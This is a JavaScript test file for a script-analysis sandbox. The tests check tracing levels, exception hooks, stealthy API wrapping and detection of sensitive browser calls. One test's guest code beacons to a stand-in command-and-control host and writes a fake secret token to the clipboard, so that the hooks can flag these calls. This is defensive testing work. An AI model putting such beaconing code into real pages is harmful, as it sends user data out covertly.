import test from 'node:test'
import assert from 'node:assert/strict'
import { TracelessSandbox } from '../tools/sandbox/sandbox.js'

const ENV = ['globals', 'console', 'timers', 'encoding', 'time', 'stack', 'random', 'storage', 'anti-fingerprint']

async function sandbox(options = {}) {
  return TracelessSandbox.create({
    logLevel: 'silent',
    env: { strict: false, only: ENV },
    ...options,
  })
}

test('instrumentation levels control granularity', async () => {
  const source = `
    function work(n) {
      var total = 0;
      for (var i = 0; i < n; i++) { total += i }
      return total;
    }
    work(3)
  `
  const sb = await sandbox()
  try {
    const off = await sb.run(source, { level: 'off' })
    const fn = await sb.run(source, { level: 'function' })
    const statement = await sb.run(source, { level: 'statement' })
    const count = (run, event) =>
      (run.events ?? []).filter((item) => item.kind === 'code' && item.event === event).length

    assert.equal(off.result.value, 3)
    assert.equal(fn.result.value, 3)
    assert.equal(statement.result.value, 3)

    assert.equal(count(off, 'statement'), 0)
    assert.equal(count(off, 'function:enter'), 0)
    assert.ok(count(fn, 'function:enter') >= 1)
    assert.equal(count(fn, 'statement'), 0)
    assert.ok(count(statement, 'statement') >= 3)
    assert.ok(count(statement, 'loop') >= 1)
  } finally {
    sb.dispose()
  }
})

test('catch clauses are traced and their error stacks sanitised in place', async () => {
  const sb = await sandbox()
  try {
    const run = await sb.run(
      `
      var observed = null;
      try { null.boom } catch (e) { observed = e.stack }
      observed
    `,
      { filename: 'https://cdn.test/app.js' },
    )
    assert.equal(run.ok, true)
    const catches = (run.events ?? []).filter((event) => event.kind === 'code' && event.event === 'catch')
    assert.ok(catches.length >= 1, 'catch clause not traced')
    assert.doesNotMatch(run.result.value, /<eval>|ai4r-internal/)
    assert.match(run.result.value, /cdn\.test\/app\.js/)
  } finally {
    sb.dispose()
  }
})

test('wrapped host APIs keep name, length and native source', async () => {
  const sb = await sandbox()
  try {
    const run = await sb.run(`
      ({
        name: localStorage.setItem.name,
        length: localStorage.setItem.length,
        source: localStorage.setItem.toString(),
        getItemName: localStorage.getItem.name,
        globalFetch: typeof fetch
      })
    `)
    assert.equal(run.ok, true)
    const value = JSON.parse(run.result.preview)
    assert.equal(value.name, 'setItem')
    assert.equal(value.length, 2)
    assert.match(value.source, /native code/)
    assert.equal(value.getItemName, 'getItem')
  } finally {
    sb.dispose()
  }
})

test('api:before hooks can mock a call without the guest noticing', async () => {
  const sb = await sandbox()
  try {
    const run = await sb.run(
      `
      localStorage.setItem('marker', 'value');
      ({ stored: localStorage.getItem('marker'), length: localStorage.length })
    `,
      {
        hooks: [
          {
            phase: 'api:before',
            priority: 100,
            handler: (payload) =>
              payload.api === 'localStorage.setItem' ? { block: undefined } : undefined,
          },
        ],
      },
    )
    assert.equal(run.ok, true)
    const value = JSON.parse(run.result.preview)
    assert.equal(value.stored, null)
    assert.equal(value.length, 0)
    const mocks = (run.events ?? []).filter((event) => event.kind === 'api' && event.mock)
    assert.ok(mocks.length >= 1)
  } finally {
    sb.dispose()
  }
})

test('api:before hooks can rewrite arguments', async () => {
  const sb = await sandbox()
  try {
    const run = await sb.run(
      `
      localStorage.setItem('key', 'original');
      localStorage.getItem('key')
    `,
      {
        hooks: [
          {
            phase: 'api:before',
            priority: 100,
            handler: (payload) =>
              payload.api === 'localStorage.setItem' ? { args: ['key', 'rewritten'] } : undefined,
          },
        ],
      },
    )
    assert.equal(run.result.value, 'rewritten')
  } finally {
    sb.dispose()
  }
})

test('instrumentation stats prove what was inserted', async () => {
  const sb = await sandbox()
  try {
    const run = await sb.run('function a(){ return 1 } function b(){ return a() + 1 } b()')
    const stats = run.instrumentation?.stats
    assert.ok(stats)
    assert.ok(stats.functions >= 2)
    assert.ok(stats.insertions > 0)
    assert.equal(run.instrumentation.describe.code.level, 'statement')
    assert.ok(run.instrumentation.describe.api.wrapped >= 1)
  } finally {
    sb.dispose()
  }
})

test('instrumentation budget truncates tracing instead of failing the run', async () => {
  const sb = await sandbox({ instrumentation: { code: { level: 'statement', maxEvents: 5 } } })
  try {
    const run = await sb.run('var t = 0; for (var i = 0; i < 50; i++) { t += i } t')
    assert.equal(run.ok, true)
    assert.equal(run.result.value, 1225)
    const truncated = (run.events ?? []).some((event) => event.kind === 'code' && event.event === 'trace-truncated')
    assert.equal(truncated, true)
  } finally {
    sb.dispose()
  }
})

test('throw statements and catch clauses both fire exception hooks', async () => {
  const sb = await sandbox()
  try {
    const seen = []
    const run = await sb.run(
      'try { throw new TypeError("thrown-here") } catch (e) { e.message }',
      {
        hooks: [
          { phase: 'exception:throw', handler: (payload) => seen.push(['throw', payload.error.name, payload.error.message]) },
          { phase: 'exception:catch', handler: (payload) => seen.push(['catch', payload.error.message]) },
        ],
      },
    )
    assert.equal(run.ok, true)
    assert.equal(run.result.value, 'thrown-here')
    assert.deepEqual(seen[0], ['throw', 'TypeError', 'thrown-here'])
    assert.deepEqual(seen[1], ['catch', 'thrown-here'])
    const exceptions = run.instrumentation.describe.exceptions
    assert.ok(exceptions.thrown >= 1)
    assert.ok(exceptions.caught >= 1)
  } finally {
    sb.dispose()
  }
})

test('uncaught evaluation failure fires code:error and exception:uncaught hooks', async () => {
  const sb = await sandbox()
  try {
    const errors = []
    const uncaught = []
    const run = await sb.run('throw new Error("top-level")', {
      hooks: [
        { phase: 'code:error', handler: (payload) => errors.push(payload.error.message) },
        { phase: 'exception:uncaught', handler: (payload) => uncaught.push(payload.error.name) },
      ],
    })
    assert.equal(run.ok, false)
    assert.deepEqual(errors, ['top-level'])
    assert.deepEqual(uncaught, ['Error'])
    const traceEvents = (run.events ?? []).filter((event) => event.kind === 'exception')
    assert.ok(traceEvents.some((event) => event.phase === 'throw'))
    assert.ok(traceEvents.some((event) => event.phase === 'uncaught'))
  } finally {
    sb.dispose()
  }
})

test('AST hook phases are emitted during preparation', async () => {
  const sb = await sandbox()
  try {
    let nodes = 0
    let enters = 0
    let exits = 0
    const run = await sb.run(';(function f(a){ return a + 1 })(2)', {
      hooks: [
        { phase: 'ast:node', handler: () => { nodes += 1 } },
        { phase: 'ast:enter', handler: () => { enters += 1 } },
        { phase: 'ast:exit', handler: () => { exits += 1 } },
      ],
    })
    assert.equal(run.ok, true)
    assert.equal(run.result.value, 3)
    assert.ok(nodes > 5, `expected AST nodes, saw ${nodes}`)
    assert.equal(enters, exits)
  } finally {
    sb.dispose()
  }
})

test('sensitive APIs reach api:before hooks (clipboard, beacon, subtle, media)', async () => {
  const sb = await TracelessSandbox.create({ logLevel: 'silent', env: { strict: true } })
  try {
    const seen = []
    const run = await sb.run(
      `
      navigator.sendBeacon('https://c2.test/beacon', 'x');
      navigator.clipboard.writeText('secret-token');
      crypto.subtle.digest('SHA-256', new TextEncoder().encode('hash-me'));
      navigator.mediaDevices.enumerateDevices();
      history.pushState({}, '', '/next');
    `,
      {
        hooks: [
          {
            phase: 'api:before',
            handler: (payload) => {
              if (/sendBeacon|clipboard|crypto\.subtle|mediaDevices|history/.test(payload.api)) seen.push(payload.api)
            },
          },
        ],
      },
    )
    assert.equal(run.ok, true, JSON.stringify(run.error))
    for (const expected of [
      'navigator.sendBeacon',
      'navigator.clipboard.writeText',
      'crypto.subtle.digest',
      'navigator.mediaDevices.enumerateDevices',
      'history.pushState',
    ]) {
      assert.ok(seen.includes(expected), `missing hook dispatch for ${expected}; saw ${seen.join(',')}`)
    }
    const sensitive = (run.events ?? []).filter((event) => event.event === 'sensitive-api')
    assert.ok(sensitive.some((event) => event.category === 'beacon'))
    assert.ok(sensitive.some((event) => event.category === 'clipboard-access'))
  } finally {
    sb.dispose()
  }
})

test('statement instrumentation stays correct on many-statement sources', async () => {
  const sb = await sandbox()
  try {
    const statements = []
    for (let index = 0; index < 400; index += 1) {
      statements.push(`acc += ${index};`)
    }
    const source = `var acc = 0;\n${statements.join('\n')}\nacc`
    const run = await sb.run(source, { level: 'statement' })
    assert.equal(run.ok, true, JSON.stringify(run.error))
    assert.equal(run.result.value, 79800)
    const traced = (run.events ?? []).filter((event) => event.kind === 'code' && event.event === 'statement').length
    assert.ok(traced >= 400, `expected >=400 traced statements, saw ${traced}`)
  } finally {
    sb.dispose()
  }
})

test('non-default levels inject the channel binding for top-level probes', async () => {
  const sb = await sandbox()
  try {
    const topLevelCatch = `
      var observed = 'untouched';
      try { null.boom } catch (e) { observed = 'caught'; }
      observed
    `
    const fn = await sb.run(topLevelCatch, { level: 'function' })
    assert.equal(fn.ok, true, JSON.stringify(fn.error))
    assert.equal(fn.result.value, 'caught')
    assert.ok((fn.events ?? []).some((event) => event.kind === 'code' && event.event === 'catch'))

    const topLevelLoop = `
      var total = 0;
      for (var i = 0; i < 3; i += 1) { total += i; }
      total
    `
    const branch = await sb.run(topLevelLoop, { level: 'branch' })
    assert.equal(branch.ok, true, JSON.stringify(branch.error))
    assert.equal(branch.result.value, 3)
    assert.ok((branch.events ?? []).some((event) => event.kind === 'code' && event.event === 'loop'))
  } finally {
    sb.dispose()
  }
})

test('catch and throw probes never run guest getters', async () => {
  const sb = await sandbox()
  try {
    const run = await sb.run(
      `
      var marks = 0;
      function probe() { marks += 1; return 'never-read'; }
      var caught = null;
      try {
        throw { get stack() { return probe(); }, get message() { return probe(); } };
      } catch (e) { caught = 'handled'; }
      caught + ':' + marks
    `,
    )
    assert.equal(run.ok, true, JSON.stringify(run.error))
    assert.equal(run.result.value, 'handled:0', 'a guest getter ran during trace summarisation')
  } finally {
    sb.dispose()
  }
})
